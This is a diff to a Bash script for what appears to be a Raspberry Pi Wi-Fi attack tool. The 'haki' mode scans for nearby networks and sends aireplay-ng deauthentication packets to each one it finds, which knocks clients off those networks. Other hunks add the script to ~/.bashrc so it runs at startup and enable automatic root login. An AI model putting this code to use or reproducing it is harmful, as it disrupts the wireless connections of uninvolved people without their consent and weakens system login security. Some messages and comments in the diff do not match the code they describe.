@@ -84,18 +84,21 @@ menu()
 
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
-				echo "./rasperish/rasperi.sh --closest" >> ~/.bashrc
+				#include 5 seconds for safety, so you can ssh
+				echo "sleep 10; ./rasperish/rasperi.sh --closest" >> ~/.bashrc
 			fi
-			#reboot
+			echo "	[i] Closest mode enabled, will be available after reboot."
+			sleep 2
 			;;
 
 		4 )
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
-				#include 5 seconds for safety
-				echo "sleep 5; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
+				#include 5 seconds for safety, so you can ssh
+				echo "sleep 10; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
 			fi
-			#reboot
+			echo "	[i] Haki mode enabled, will be available after reboot."
+			sleep 2
 			;;
 
 
@@ -111,11 +114,15 @@ menu()
 enable_autologin()
 {
 	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -a root --noclear %I \$TERM" /lib/systemd/system/getty@.service
+	echo "	[i] Enabled auto-login"
+	sleep 1
 }
 
 disable_autologin()
 {
 	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear %I \$TERM" /lib/systemd/system/getty@.service
+	echo "	[i] Enabled auto-login"
+	sleep 1
 }
 
 haki()
@@ -125,11 +132,11 @@ haki()
 	#create the working directory, where we save our scan files temporarily
 	create_working_folder
 
-	echo "	[i] Continuously scanning for networks... "
+	echo "	[i] Scanning continuously  for networks... "
 	echo
 
 	#scan every n seconds
-	scan 10
+	scan 5
 
 	while true
 	do
@@ -137,8 +144,7 @@ haki()
 		while read essid
 		do
 			#get each corresponding channel for every essid found
-			#channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
-      channel=$(sed -n "${i}{p;q;}" $(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2))
+			channel=$(sed -n "${i}{p;q;}" $(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2))
 
 			echo "	[+] Synchronising card to channel: $channel"
 			#sync the card to the victim's channel
@@ -149,8 +155,7 @@ haki()
 			aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
 
 			((i++))
-		#done < "$working_folder"/perish_dump/essids
-  done < $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
+		done < $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
 	done #loop when you are done
 }
 
@@ -163,7 +168,7 @@ start_mon()
 {
 	#m2 is the correct mode, however it seems that there is a bug and in m2 mode sometimes nothing can be scanned
 	#doing this, solves that case
-	#nexutil -m1
+	iw dev $interface set power_save off
 	nexutil -m2
 }
 
@@ -174,23 +179,8 @@ scan()
 	#start data dumping every n seconds
 	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval &
 
-	#start chopping the data in a desirable format every n seconds
-	#scan_data_chopper $scan_interval &
-
 	#add an initial hysteresis before starting in order to have data ready
 	sleep $scan_interval
-}
-
-scan_data_chopper()
-{
-	while true
-	do
-		#sleep on first loop because you must wait for data
-		sleep $1
-		awk -F "\"*;\"*" '{print $4}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/bssids
-		awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/essids
-		awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$working_folder"/perish_dump/channels
-	done
 }
 
 #Here starts the script and passes the flag argument to it
